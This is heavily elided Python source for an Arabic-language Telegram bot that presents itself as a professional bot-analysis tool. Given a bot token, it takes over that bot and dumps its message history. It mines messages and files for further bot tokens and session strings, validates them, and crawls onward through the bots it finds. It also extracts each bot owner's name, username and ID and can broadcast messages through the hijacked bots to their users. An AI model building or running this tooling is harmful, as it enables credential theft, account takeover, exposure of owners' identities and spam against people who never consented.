...
async def init_database():
    ...
    async with aiosqlite.connect(DB_PATH) as db:
        # تفعيل WAL mode للسماح بقراءات وكتابات متزامنة
...
async def with_db_retry(func, max_retries=3, delay=0.1):
...
async def with_telegram_retry(func, max_retries=12, delay=2):
...
async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=None, stop_event=None):
    ...
    while current_id <= end_id:
        ...
        user_state = await get_user_state(target_id)
        if user_state.get('stop_requested'):
            print(f"⏹ تم إيقاف نقل الرسائل بطلب من المستخدم {target_id}")
            break
            ...
            for m in messages.messages:
                ...
                if progress_callback and (current_time - last_update_time >= 5 or success_count + failed_count == total_messages):
                    ...
                    if not await progress_callback(success_count + failed_count, total_messages):
                        ...
                        await set_user_state(target_id, user_state)
                        break
...
async def analyze_bot(bot_token, user_id, progress_callback=None):
    ...
    try:
        ...
        for i in range(1, max_id + 1, chunk_size):
            ...
            tasks.append(process_message_chunk(temp_bot, i, end_range, stats, seen_tokens, seen_sessions, user_id))
...
async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_sessions, user_id=None):
    """معالجة جزء من الرسائل بشكل منفصل وحفظ البيانات مباشرة"""
    try:
                            ...
                            if file_data:
                                ...
                                for token in TOKEN_PATTERN.findall(text_data):
                                    if token not in seen_tokens:
                                        ...
                                        stats['tokens']['details'].append(token_data)

                                        # حفظ التوكن مباشرة في قاعدة البيانات
                                        if user_id:
                                            try:
                                                cache_key = f"temp_token_{user_id}_{token}"
                                                await set_cached_analysis(cache_key, token_data, expiry_hours=1)
                                            except:
                                                pass
                                ...
                                for session in SESSION_PATTERN_CHAT.findall(text_data):
                                    if session not in seen_sessions:
                                        ...
                                        stats['sessions']['details'].append(session_data)

                                        # حفظ الجلسة مباشرة في قاعدة البيانات
                                        if user_id:
                                            try:
                                                cache_key = f"temp_session_{user_id}_{hash(session)}"
                                                await set_cached_analysis(cache_key, session_data, expiry_hours=1)
                                            except:
                                                pass
...
async def deep_network_analysis(main_bot_token, user_id, progress_callback=None, stop_event=None):
    ...
    try:
        ...
        aggregated_stats = {
            ...
            'all_users': list(main_analysis['user_ids']),
...
async def network_send_tokens(main_bot, all_bots_data, user_id):
    ...
    try:
        ...
        user_state = await get_user_state(user_id)
        user_state['network_tokens'] = valid_tokens
        await set_user_state(user_id, user_state)


        buttons = [
            [Button.inline("📝 إرسال التوكنات نصياً", "network_send_tokens_text")],
            [Button.inline("📁 إرسال التوكنات في ملف", "network_send_tokens_file")]
        ]

        await main_bot.send_message(
            user_id,
            f"🔑 تم العثور على {len(valid_tokens)} توكن صالح من الشبكة\n\n"
...
async def handle_file_tokens(event, user_id, valid_tokens):
...
async def update_progress_in_db(user_id, current, total, message_type="transfer"):
    ...
    if 'progress_message' in user_state:
        try:
            progress_msg = user_state['progress_message']

            new_text = f"📤 {message_type}: {current}/{total} ({user_state['progress']['percentage']:.1f}%)"
...
async def extract_token_section(full_text, token):
    try:

        lines = full_text.split('\n')
        current_section = []
        found_token_section = None

        for line in lines:
            if line.startswith('🆔 الرقم:'):

                if current_section and token in '\n'.join(current_section):
                    found_token_section = '\n'.join(current_section)
                    break
        ...
        if not found_token_section and current_section and token in '\n'.join(current_section):
            found_token_section = '\n'.join(current_section)

        return found_token_section

    except Exception as e:
        print(f"❌ خطأ في استخراج قسم التوكن: {e}")
        return None


async def extract_number_from_section(section_text, keyword):
    try:
...
async def analyze_token_with_owner(token, user_id, original_text=None):
    """تحليل التوكن واستخراج معلومات البوت والمالك"""
    temp_bot = None
    try:
        temp_session = os.path.join(SESSION_DIR, f"owner_analysis_{int(time.time())}_{hash(token)}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)


        temp_bot.flood_sleep_threshold = 0
        ...
        try:
            owner_info = await get_first_message_sender(temp_bot)
        except Exception as e:
            owner_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
        ...
        users_count = 'غير معروف'

        if original_text:

            token_section = await extract_token_section(original_text, token)
            if token_section:
                messages_count = await extract_number_from_section(token_section, 'رسائل')
                users_count = await extract_number_from_section(token_section, 'مستخدمين')

        bot_info_data = {
            'valid': True,
            'bot_name': me.first_name or 'غير معروف',
            'bot_username': me.username or 'غير معروف',
            'bot_id': me.id,
...
async def get_first_message_sender(bot):
    try:

        max_id = await find_max_message_id(bot)

        if max_id == 0:
            return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
        ...
        for start_id in range(1, max_id + 1, batch_size):
            ...
            try:
                ...
                for message in messages.messages:
                    ...
                    owner_info = await extract_sender_info_from_message(bot, message, bot_id)
                    if owner_info and owner_info.get('user_id') != 'غير معروف':
                        pass
                        return owner_info
        ...
        print(f"❌ خطأ عام في البحث عن المالك: {e}")
        return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}


async def extract_sender_info_from_message(bot, message, bot_id):
    try:
        sender_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
        ...
        if hasattr(message, 'from_id') and message.from_id:
            ...
            if user_id and user_id != bot_id:
                sender_info['user_id'] = str(user_id)


                try:
                    user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=int(user_id), access_hash=0)))
                    if user_entity and user_entity.users:
                        user_data = user_entity.users[0]
                        if hasattr(user_data, 'first_name') and user_data.first_name:
                            sender_info['name'] = user_data.first_name
                        if hasattr(user_data, 'username') and user_data.username:
                            sender_info['username'] = f"@{user_data.username}"
                        return sender_info
                except Exception as e:
                    print(f"⚠️ خطأ في GetFullUserRequest لـ {user_id}: {e}")

                    try:
                        user = await bot.get_entity(int(user_id))
                        if user:
                            if hasattr(user, 'first_name') and user.first_name:
                                sender_info['name'] = user.first_name
                            if hasattr(user, 'username') and user.username:
                                sender_info['username'] = f"@{user.username}"
                            return sender_info
                    except Exception as e2:
                        print(f"⚠️ خطأ في get_entity لـ {user_id}: {e2}")

                        return sender_info


        elif hasattr(message, 'sender') and message.sender:
            if (hasattr(message.sender, 'id') and 
                message.sender.id != bot_id):

                sender_info['user_id'] = str(message.sender.id)
                if hasattr(message.sender, 'first_name') and message.sender.first_name:
                    sender_info['name'] = message.sender.first_name
                if hasattr(message.sender, 'username') and message.sender.username:
                    sender_info['username'] = f"@{message.sender.username}"
                return sender_info
            ...
            if hasattr(message.peer_id, 'user_id'):
                ...
                if user_id != bot_id:
                    ...
                    try:
                        user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=user_id, access_hash=0)))
                        if user_entity and user_entity.users:
                            user_data = user_entity.users[0]
                            if hasattr(user_data, 'first_name') and user_data.first_name:
                                sender_info['name'] = user_data.first_name
...
async def main():
    ...
    async def start_handler(event):
        if not await check_user_permission(event):
            return

        user_id = event.sender_id

        await set_user_state(user_id, {'step': 'start'})
        await event.respond("🤖 **بوت تحليل البوتات الاحترافي** 🚀\n\n"
                          "👨‍💻 المطور: @Khalidd_sw\n\n"
                          "📋 **الأوامر المتاحة:**\n\n"
                          "🔹 /dump - تحليل وسحب محتوى البوت\n"
                          "🔹 /file - تحليل ملف توكنات\n"
                          "🔹 /owner - استخراج معلومات مالك البوت\n\n"
                          "💡 **المميزات:**\n"
                          "• تحليل شامل للبوتات\n"
                          "• استخراج الملفات والصور\n"
                          "• كشف التوكنات والجلسات\n"
                          "• فحص شبكي متعمق\n"
                          "• إذاعة جماعية\n\n"
                          "ابدأ باستخدام أحد الأوامر أعلاه ⬆️")
    ...
    async def owner_handler(event):
        ...
        await set_user_state(user_id, {'step': 'waiting_owner_input'})
        await event.respond("👑 **أمر تحليل ملاك البوتات**\n\n"
                          "📝 **أرسل أحد الخيارات التالية:**\n\n"
                          "1️⃣ توكن واحد مباشرة\n"
                          "2️⃣ ملف txt يحتوي على توكنات متعددة\n\n"
                          "سأقوم باستخراج:\n"
                          "• ✅ معلومات البوت\n"
                          "• 🔍 معلومات المالك\n"
                          "• 📊 الإحصائيات")
    ...
    async def owner_file_receiver_handler(event):
        user_id = event.sender_id
        user_state = await get_user_state(user_id)

        if user_state.get('step') != 'waiting_owner_input':
            return
        ...
        try:
            ...
            await event.respond(f"🔍 تم العثور على {len(unique_tokens)} توكن في الملف\n⏳ جاري التحقق من التوكنات وتحليل الملاك...")


            valid_tokens_with_owners = []
            total_tokens = len(unique_tokens)

            progress_msg = await event.respond(f"⏳ جاري فحص التوكنات وتحليل الملاك...\n📊 التقدم: 0/{total_tokens} (0%)")

            last_update_time = 0

            async def update_owner_progress(current, total):
                nonlocal last_update_time
                current_time = time.time()
                if current_time - last_update_time >= 3 or current == total:
                    last_update_time = current_time
                    percent = (current / total) * 100
                    new_text = f"⏳ جاري فحص التوكنات وتحليل الملاك...\n📊 التقدم: {current}/{total} ({percent:.1f}%)"
            ...
            for i in range(0, len(unique_tokens), batch_size):
                ...
                tasks = [analyze_token_with_owner(token, user_id, text_content) for token in batch]
                ...
                for j, result in enumerate(batch_results):
                    ...
                    if token_index < len(unique_tokens):
                        if isinstance(result, Exception):
                            ...
                            valid_tokens_with_owners.append(result)
                            pass


                if not await update_owner_progress(i + len(batch), total_tokens):
                    break

            await progress_msg.delete()

            print(f"📊 النتائج النهائية: {len(valid_tokens_with_owners)} توكن صالح من أصل {total_tokens}")

            if not valid_tokens_with_owners:
                await event.respond("❌ لم يتم العثور على أي توكنات صالحة أو لم نتمكن من تحليل الملاك")
                await set_user_state(user_id, {'step': 'start'})
                return


            new_file_content = ""
            for i, token_data in enumerate(valid_tokens_with_owners, 1):
                token = token_data['token']
                bot_info = token_data.get('bot_info', {})
                owner_info = token_data.get('owner_info', {})

                new_file_content += f"🆔 الرقم: {i}\n"
                new_file_content += f"🔐 معلومات التوكن:\n`{token}`\n"
                new_file_content += f"🤖 معلومات البوت:\n"
                new_file_content += f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
                new_file_content += f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
                new_file_content += f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
                new_file_content += f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
                new_file_content += f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}\n"


                if owner_info:
                    new_file_content += f"👑 معلومات المالك:\n"
                    new_file_content += f"├ اسمه: {owner_info.get('name', 'غير معروف')}\n"
                    new_file_content += f"├ يوزر: {owner_info.get('username', 'غير معروف')}\n"
                    new_file_content += f"└ ايديه: {owner_info.get('user_id', 'غير معروف')}\n"
                else:
                    new_file_content += f"👑 معلومات المالك:\n├ لم يتم العثور على معلومات المالك\n"


                new_file_content += "- - - - - - - - - - - - - - - -\n\n"


            filename = f"tokens_with_owners_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
            ...
            await bot.send_file(
                entity=user_id,
                file=filename,
                caption=f"👑 ملف التوكنات مع معلومات الملاك\n• عدد التوكنات الصالحة: {len(valid_tokens_with_owners)}\n• تم تحليل أول رسالة في كل بوت لاكتشاف المالك",
            attributes=[DocumentAttributeFilename("tokens_with_owners.txt")]
        )
            ...
            owners_found = sum(1 for token_data in valid_tokens_with_owners if token_data.get('owner_info'))

            await event.respond(
                f"✅ **تم الانتهاء من تحليل الملاك**\n\n"
                f"📊 النتائج:\n"
                f"• إجمالي التوكنات الصالحة: {len(valid_tokens_with_owners)}\n"
                f"• عدد الملاك المكتشفين: {owners_found}\n"
                f"• نسبة النجاح: {(owners_found/len(valid_tokens_with_owners))*100:.1f}%"
        )
    ...
    async def send_tokens_handler(event):
        ...
        if data == 'send_tokens_text':
            ...
            for i, token_info in enumerate(tokens_data):
                ...
                await event.respond(message, buttons=broadcast_button, parse_mode='html')
    ...
    async def file_broadcast_message_handler(event):
        ...
        async def update_file_broadcast_progress(current_bots, total_bots, success_count, failed_count):
            ...
            current_time = time.time()
            current_percent = (current_bots / total_bots) * 100 if total_bots > 0 else 0
    ...
    async def callback_handler(event):
        ...
        if user_state.get('stop_requested'):
            ...
            await set_user_state(user_id, user_state)
            await event.answer("ℹ️ تم إلغاء الإيقاف")
            return
        ...
        if data == 'all_messages':
            ...
            user_state['operation_in_progress'] = True
            await set_user_state(user_id, user_state)
            ...
            user_state['progress_message'] = {
                'id': progress_msg.id,
                'chat_id': progress_msg.chat_id,
                'text': "🚀 بدء نقل الرسائل من 1 إلى {}...".format(max_id)
            }
            await set_user_state(user_id, user_state)
            ...
            async def update_progress(current, total):
                ...
                if (current_time - last_update_time >= 5 or 
                    ...
                    current_state['progress_message']['text'] = new_text
                    await set_user_state(user_id, current_state)
            ...
            try:
                ...
                user_state = await get_user_state(user_id)
                user_state['operation_in_progress'] = False
                user_state['stop_requested'] = False
                if 'progress_message' in user_state:
                    del user_state['progress_message']
                await set_user_state(user_id, user_state)
            ...
            try:
                ...
                tokens_details = user_state['analysis']['tokens']['details']
                valid_tokens = [token for token in tokens_details if token.get('valid', False)]

                if valid_tokens:
                    user_state['valid_tokens_list'] = valid_tokens
                    await set_user_state(user_id, user_state)

                    buttons = [
                        [Button.inline("📝 إرسال التوكنات نصياً", "send_tokens_text_main")],
                        [Button.inline("📁 إرسال التوكنات في ملف", "send_tokens_file_main")]
                    ]

                    await event.respond(
                        f"🔑 تم العثور على {len(valid_tokens)} توكن صالح\n\n"
                        f"اختر طريقة الإرسال:",
                        buttons=buttons
                    )
                else:
                    await event.answer("❌ ما لقيتش أي توكنات صالحة")
    ...
    @bot.on(events.CallbackQuery(pattern='network_send_tokens_(text|file)'))
    async def network_send_tokens_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')

        user_state = await get_user_state(user_id)
        if 'network_tokens' not in user_state:
            await event.answer("❌ لا توجد توكنات شبكية جاهزة للإرسال")
            return

        tokens_data = user_state['network_tokens']

        if data == 'network_send_tokens_text':
            await event.answer("📝 بدء إرسال التوكنات الشبكية نصياً...")
            ...
            await event.answer(f"✅ تم إرسال {len(tokens_data)} توكن شبكي")

        elif data == 'network_send_tokens_file':
            await event.answer("📁 بدء إنشاء ملف التوكنات الشبكية...")
            ...
            filename = f"network_tokens_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(file_content)
            ...
            await bot.send_file(
                entity=user_id,
                file=filename,
                caption=f"🔑 ملف التوكنات الشبكية المستخرجة\n• عدد التوكنات: {len(tokens_data)}",
                attributes=[DocumentAttributeFilename("network_tokens.txt")]
            )
            ...
            await event.answer("✅ تم إرسال ملف التوكنات الشبكية")


    @bot.on(events.CallbackQuery(pattern='send_tokens_(text|file)_main'))
    async def send_tokens_main_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')

        user_state = await get_user_state(user_id)
        if 'valid_tokens_list' not in user_state:
            await event.answer("❌ لا توجد توكنات جاهزة للإرسال")
            return

        tokens_data = user_state['valid_tokens_list']

        if data == 'send_tokens_text_main':
            await event.answer("📝 بدء إرسال التوكنات نصياً...")
        ...
        elif data == 'send_tokens_file_main':
            await event.answer("📁 بدء إنشاء ملف التوكنات...")
    ...
    async def message_handler(event):
        ...
        if user_state['step'] == 'waiting_owner_input':
            # التحقق من وجود توكن في النص
            token_match = TOKEN_PATTERN.search(text)

            if not token_match:
                await event.respond("❌ لم يتم العثور على توكن صالح في الرسالة")
                return

            token = token_match.group(0)

            progress_msg = await event.respond("⏳ جاري تحليل البوت واستخراج معلومات المالك...")

            try:
                # تحليل التوكن واستخراج معلومات المالك
                result = await analyze_token_with_owner(token, user_id, None)

                if not result:
                    await progress_msg.edit("❌ فشل تحليل التوكن")
                    await set_user_state(user_id, {'step': 'start'})
                    return
                ...
                # إنشاء رسالة بالمعلومات
                message = (
                    f"✅ **تم تحليل التوكن بنجاح**\n\n"
                    f"🔐 **التوكن:**\n`{token}`\n\n"
                    f"🤖 **معلومات البوت:**\n"
                    f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
                    f"├ اليوزر: @{bot_info.get('bot_username', 'غير معروف')}\n"
                    f"└ الآيدي: `{bot_info.get('bot_id', 'غير معروف')}`\n\n"
                    f"👑 **معلومات المالك:**\n"
                    f"├ الاسم: {owner_info.get('name', 'غير معروف')}\n"
                    f"├ اليوزر: {owner_info.get('username', 'غير معروف')}\n"
                    f"└ الآيدي: `{owner_info.get('user_id', 'غير معروف')}`"
                )

                await progress_msg.edit(message, parse_mode='markdown')
                await set_user_state(user_id, {'step': 'start'})

            except Exception as e:
                await progress_msg.edit(f"❌ حدث خطأ في التحليل: {str(e)}")
                await set_user_state(user_id, {'step': 'start'})
        ...
        if user_state['step'] == 'waiting_token':
            ...
            user_state['progress_message'] = {
                'id': progress_msg.id,
                'chat_id': progress_msg.chat_id,
                'text': "⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: 0%"
            }
            await set_user_state(user_id, user_state)
            ...
            user_state['progress_message'] = {
                'id': progress_msg.id,
                'chat_id': progress_msg.chat_id,
                'text': f"🚀 بدء ارسال الرسائل النص إلى {total_users} مستخدم..."
            }
            await set_user_state(user_id, user_state)
            ...
            try:
                ...
                if 'progress_message' in user_state:
                    del user_state['progress_message']
                if 'broadcast_data' in user_state:
                    del user_state['broadcast_data']
                await set_user_state(user_id, user_state)
            ...
            try:
                ...
                user_state['progress_message'] = {
                    'id': progress_msg.id,
                    'chat_id': progress_msg.chat_id,
                    'text': f"🚀 بدء ارسال الرسائل من البوت الثانوي إلى {total_users} مستخدم..."
                }
                await set_user_state(user_id, user_state)
                ...
                if 'broadcast_data' in user_state:
                    del user_state['broadcast_data']
                if 'current_broadcast_token' in user_state:
            ...
            user_state['progress_message'] = {
                'id': progress_msg.id,
                'chat_id': progress_msg.chat_id,
                'text': f"🚀 بدء الإذاعة الشبكية إلى {len(all_bots)} بوت..."
            }
            await set_user_state(user_id, user_state)
